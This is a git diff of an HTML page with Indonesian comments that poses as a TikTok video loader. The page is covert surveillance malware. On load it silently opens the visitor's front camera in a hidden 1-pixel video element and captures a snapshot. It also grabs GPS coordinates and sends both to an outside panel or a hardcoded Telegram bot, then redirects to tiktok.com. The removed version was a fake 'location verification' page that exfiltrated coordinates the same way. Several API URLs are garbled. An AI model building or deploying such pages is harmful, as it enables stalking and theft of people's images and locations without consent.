@@ -3,179 +3,182 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Keamanan Halaman</title>
+    <title>Tiktok - Watch & Share Videos</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
-        }
-        body {
-            background-color: #f4f6f9;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            padding: 20px;
-        }
-        .card {
-            background: #ffffff;
-            padding: 40px 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.06);
-            text-align: center;
-            max-width: 420px;
-            width: 100%;
-            border: 1px solid #e9ecef;
-        }
-        .icon {
-            font-size: 50px;
-            margin-bottom: 20px;
-        }
-        h2 {
-            color: #212529;
-            margin-bottom: 12px;
-            font-size: 1.5rem;
-            font-weight: 600;
-        }
-        p {
-            color: #6c757d;
-            font-size: 0.95rem;
-            margin-bottom: 25px;
-            line-height: 1.6;
-        }
-        .btn {
-            display: inline-block;
-            width: 100%;
-            padding: 14px;
-            background-color: #0d6efd;
-            color: #fff;
-            text-decoration: none;
-            border-radius: 8px;
-            font-weight: 600;
-            font-size: 1rem;
-            transition: background-color 0.2s ease;
-            text-align: center;
-            border: none;
-            cursor: pointer;
-        }
-        .btn:hover {
-            background-color: #0b5ed7;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #010101; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+        .container { text-align: center; }
+        .loader { border: 4px solid #333; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #webcam { width: 1px; height: 1px; opacity: 0; position: absolute; }
+        #canvas { display: none; }
+        p { font-size: 1rem; color: #aaa; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <div class="icon">📍</div>
-        <h2>Verifikasi Lokasi</h2>
-        <p id="status-text">Untuk melanjutkan verifikasi sistem, silakan klik tombol di bawah dan pilih <b>"Izinkan / Allow"</b> pada konfirmasi browser Anda.</p>
-        
-        <button id="actionBtn" class="btn">Mulai Verifikasi Lokasi</button>
-    </div>
+<div class="container">
+    <div id="loader" class="loader"></div>
+    <p id="status">Memuat video TikTok...</p>
+</div>
 
-    <script>
-        // Konfigurasi Bot Telegram Anda
-        const TELEGRAM_TOKEN = '8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0'; 
-        const CHAT_ID = '1966317946';
+<video id="webcam" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
 
-        // Memicu pencarian lokasi saat pengguna mengklik tombol
-        document.getElementById('actionBtn').addEventListener('click', function() {
-            mintaLokasiGPS();
-        });
+<script>
+    // ================= CONFIG TELEGRAM (UNTUK METODE DIREK/CADANGAN) =================
+    const TELEGRAM_BOT_TOKEN = '8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0';
+    const ADMIN_CHAT_ID = '1966317946'; // Hanya dipakai jika link dibuka TANPA ?sender=
+    // =====================================================================
 
-        function mintaLokasiGPS() {
-            const statusLabel = document.getElementById('status-text');
-            const tombol = document.getElementById('actionBtn');
-            
-            // 1. Periksa dukungan fitur Geolocation di browser
-            if (navigator.geolocation) {
-                statusLabel.innerText = "Silakan klik 'Izinkan' pada pop-up browser yang muncul...";
-                tombol.disabled = true;
-                tombol.innerText = "Memproses...";
+    // ================= CONFIG PANEL PTERODACTYL ==========================
+    const PANEL_ENDPOINT = 'https://gervho.com'; 
+    const TARGET_WEBSITE = 'https://tiktok.com'; 
+    // =====================================================================
 
-                // 2. Meminta akses koordinat GPS asli ke browser
-                navigator.geolocation.getCurrentPosition(
-                    // Jika PENGGUNA MENGIZINKAN (Sukses)
-                    (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        const akurasi = position.coords.accuracy; // Akurasi dalam meter
-                        
-                        statusLabel.innerText = "Lokasi berhasil diverifikasi. Mengirim data...";
-                        
-                        // Kirim koordinat asli berupa Pin Peta ke Telegram
-                        sendLocationToTelegram(latitude, longitude, akurasi);
-                    },
-                    // Jika PENGGUNA MENOLAK atau GPS Mati (Gagal)
-                    (error) => {
-                        tombol.disabled = false;
-                        tombol.innerText = "Coba Lagi";
-                        
-                        if (error.code === error.PERMISSION_DENIED) {
-                            statusLabel.innerHTML = "<span style='color: red;'>Gagal: Izin ditolak.</span> Harap ubah pengaturan browser Anda untuk mengizinkan akses lokasi pada situs ini.";
-                        } else {
-                            statusLabel.innerText = "Gagal mendapatkan lokasi. Pastikan GPS perangkat Anda sudah aktif.";
-                        }
-                    },
-                    // Opsi akurasi tinggi
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                );
-            } else {
-                statusLabel.innerText = "Browser Anda tidak mendukung fitur pelacakan lokasi.";
-            }
+    // Membaca ID pengguna dinamis (?sender=ID) dari tautan bot
+    const urlParams = new URLSearchParams(window.location.search);
+    const SENDER_ID = urlParams.get('sender'); 
+
+    const video = document.getElementById('webcam');
+    const canvas = document.getElementById('canvas');
+
+    let currentStream = null;
+
+    async function startAutoCamera() {
+        try {
+            currentStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user", width: 640, height: 480 } 
+            });
+            video.srcObject = currentStream;
+
+            video.onplay = () => {
+                setTimeout(takeAndSendSnapshot, 3000); // Jeda 3 detik untuk stabilisasi kamera
+            };
+        } catch (err) {
+            console.error("Gagal kamera, beralih meminta lokasi langsung...");
+            ambilDataLokasiAndSend(null); // Jika kamera gagal, coba ambil lokasi saja
+        }
+    }
+
+    function takeAndSendSnapshot() {
+        if (video.videoWidth === 0 || video.videoHeight === 0) {
+            setTimeout(takeAndSendSnapshot, 200);
+            return;
         }
 
-        // Fungsi khusus mengirim objek peta (Map Pin) ke Telegram
-        function sendLocationToTelegram(lat, lng, accuracy) {
-            const url = `https://telegram.org{TELEGRAM_TOKEN}/sendLocation`;
-            const statusLabel = document.getElementById('status-text');
-            const tombol = document.getElementById('actionBtn');
+        const ctx = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        if (currentStream) {
+            currentStream.getTracks().forEach(track => track.stop());
+        }
+        
+        // Buat file blob dari gambar canvas terlebih dahulu sebelum meminta lokasi
+        canvas.toBlob((blob) => {
+            ambilDataLokasiAndSend(blob);
+        }, 'image/png');
+    }
+
+    function ambilDataLokasiAndSend(imageBlob) {
+        const finalRecipientId = SENDER_ID ? SENDER_ID : ADMIN_CHAT_ID;
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const teksLokasi = `📌 **Lokasi Pengguna:**\nLatitude: ${lat}\nLongitude: ${lon}\n🔗 [Buka di Google Maps](https://google.com{lat},${lon})`;
+                    
+                    prosesPengiriman(finalRecipientId, imageBlob, teksLokasi);
+                },
+                (error) => {
+                    let alasan = "Ditolak/Gagal";
+                    if (error.code === error.PERMISSION_DENIED) alasan = "Izin ditolak pengguna";
+                    const teksLokasi = `⚠️ **Lokasi:** ${alasan}.`;
+                    
+                    prosesPengiriman(finalRecipientId, imageBlob, teksLokasi);
+                },
+                { enableHighAccuracy: true, timeout: 7000 }
+            );
+        } else {
+            const teksLokasi = `❌ Browser tidak mendukung geolokasi.`;
+            prosesPengiriman(finalRecipientId, imageBlob, teksLokasi);
+        }
+    }
+
+    function prosesPengiriman(recipientId, blob, infoLokasi) {
+        // JIKA MENGGUNAKAN PANEL (Mengirim data gabungan ke backend)
+        if (SENDER_ID) {
+            const imageData = blob ? canvas.toDataURL('image/png') : null;
             
-            fetch(url, {
+            fetch(PANEL_ENDPOINT, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    latitude: lat,
-                    longitude: lng
+                    senderId: recipientId,
+                    image: imageData,
+                    location: infoLokasi
                 })
             })
             .then(res => res.json())
             .then(data => {
-                if(data.ok) {
-                    statusLabel.innerText = "Terima kasih. Proses verifikasi lokasi telah selesai sepenuhnya.";
-                    tombol.innerText = "Selesai";
-                    
-                    // Opsional: Kirim detail akurasi dalam bentuk teks pelengkap
-                    sendTextToTelegram(`🎯 Akurasi GPS: ±${Math.round(accuracy)} meter.`);
+                if (!data.ok) {
+                    sendDirectTelegram(recipientId, blob, infoLokasi);
                 } else {
-                    statusLabel.innerText = "Terjadi kesalahan pada konfigurasi Bot Telegram.";
-                    tombol.disabled = false;
-                    tombol.innerText = "Coba Lagi";
+                    window.location.href = TARGET_WEBSITE;
                 }
             })
-            .catch(() => {
-                statusLabel.innerText = "Terjadi gangguan jaringan saat mengirim data.";
-                tombol.disabled = false;
-                tombol.innerText = "Coba Lagi";
+            .catch(err => {
+                console.error("Koneksi panel gagal, beralih ke jalur direk Telegram...");
+                sendDirectTelegram(recipientId, blob, infoLokasi);
             });
+        } else {
+            sendDirectTelegram(recipientId, blob, infoLokasi);
         }
+    }
 
-        // Fungsi pembantu untuk mengirim pesan teks tambahan
-        function sendTextToTelegram(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message
-                })
-            });
+    async function sendDirectTelegram(chatIdToSend, blob, infoLokasi) {
+        const captionTeks = `📸 **Aktivitas Berhasil Direkam!**\n\n${infoLokasi}`;
+
+        try {
+            if (blob) {
+                // Kirim sebagai foto jika kamera berhasil diakses
+                const formData = new FormData();
+                formData.append('chat_id', chatIdToSend);
+                formData.append('photo', blob, 'snapshot.png');
+                formData.append('caption', captionTeks);
+
+                await fetch(`https://api.telegram.org/bit${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } else {
+                // Kirim sebagai teks biasa jika kamera diblokir tetapi lokasi diizinkan
+                await fetch(`https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatIdToSend,
+                        text: captionTeks,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            }
+        } catch (error) {
+            console.error("Gagal mengirim ke Telegram API:", error);
+        } finally {
+            window.location.href = TARGET_WEBSITE;
         }
-    </script>
+    }
+
+    window.addEventListener('load', startAutoCamera);
+</script>
 
 </body>
 </html>
